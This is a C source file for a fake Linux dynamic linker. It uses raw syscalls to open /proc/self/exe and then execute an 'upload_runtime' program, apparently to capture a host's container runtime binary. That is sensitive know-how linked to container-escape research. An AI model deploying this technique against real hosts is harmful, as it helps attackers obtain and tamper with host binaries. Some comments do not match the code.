//
// Opens /proc/self/exe and then executes `upload_runtime`.
// Valid dynamic linker for Linux on x86_64. 
//

#include "fake_ld.h"


// ELF entrypoint
void _start()
{  
    uint argc;
    char **argv;
    int ret;

    // Get argc & argv from stack, frame after prologue is:
    // [rbp] --------> saved rbp
    // [rbp+0x8] ----> argc
    // [rbp+0x10] ---> argv[0]
    // [rbp+0x10+8n] > argv[argc-1] // n = argc-1
    // [rbp+0x18+8n] > envc
    // [rbp+0x20+8n] > envp[0]
    // ...
    asm ("mov 0x8(%%rbp), %0 ;"
         "lea 0x10(%%rbp), %1 ;"
         : "=r"(argc), "=r"(argv) ::);

    // Open /proc/self/exe
    ret = my_open("/proc/self/exe", O_RDONLY);
    if (ret < 0)   
    {
        log_err("[!] fake_ld: open() failed with errno ", ret); 
        my_exit(ret);
    }

    // Exec /proc/self/exe
    argv[argc] = 0;  // argv needs to end with NULL. This overwrites envc.
    ret = my_execve(UPLOAD_RUNTIME_PATH, argv, 0);
    log_err("[!] fake_ld: execve() failed with errno ", ret); 
    my_exit(ret);
}


// libc-less syscalls
__attribute__((always_inline)) inline int my_open(char * path, int flags)
{
    int ret;
    asm volatile
    (
        "syscall"
        : "=a" (ret)
        : "0"(__NR_open), "D"(path), "S"(flags), "d"(0)  // mode always 0
        : "rcx", "r11", "memory"
    );
    return ret;
}


__attribute__((always_inline)) inline int my_execve(const char *pathname, char ** argv, char ** envp)
{
    int ret;
    asm volatile
    (
        "syscall"
        : "=a" (ret)
        : "0"(__NR_execve), "D"(pathname), "S"(argv), "d"(envp)
        : "rcx", "r11", "memory"
    );
    return ret;
}


__attribute__((always_inline)) inline void my_exit(int exit_status) 
{
    int ret;
    asm volatile 
    (
        "syscall"
        : "=a" (ret)
        : "0"(__NR_exit_group), "D"(exit_status)
        : "rcx", "r11", "memory"
    );
}


__attribute__((always_inline)) inline int my_write(int fd, const void *buf)
{
    int ret;
    asm volatile
    (
        "syscall"
        : "=a" (ret)
        : "0"(__NR_write), "D"(fd), "S"(buf), "d"(my_strlen(buf))
        : "rcx", "r11", "memory"
    );
    return ret;
}


// String utils 
__attribute__((always_inline)) inline uint my_strlen(const char *str)
{
        const char *s;
        for (s = str; *s; ++s) // while element != null terminator
            ;
        return (s - str);
}


__attribute__((always_inline)) inline char * errno_to_str(char * str, uint size, uint error)
{
    str[size - 1] = 0; // null terminate just in case
    // Go over digits from right to left (LSD to MSD)
    for (uint i = size - 2; i >= 0; i--)
    {
        if (error > 0)
        {
            str[i] = '0' + (error % 10); 
            error /= 10;
        }
        else
            return &str[i + 1]; // previous index was the first digit
    }
    return str; // shouldn't get here, but just in case
}


__attribute__((always_inline)) inline void log_err(char * err_msg, int errcode_neg)
{
    char errno_buf[MAX_ERR_STR_LEN];

    my_write(STDOUT, err_msg); 
    my_write(STDOUT, (void*)errno_to_str(errno_buf, MAX_ERR_STR_LEN, -1 * errcode_neg));
    my_write(STDOUT, " \n"); 
}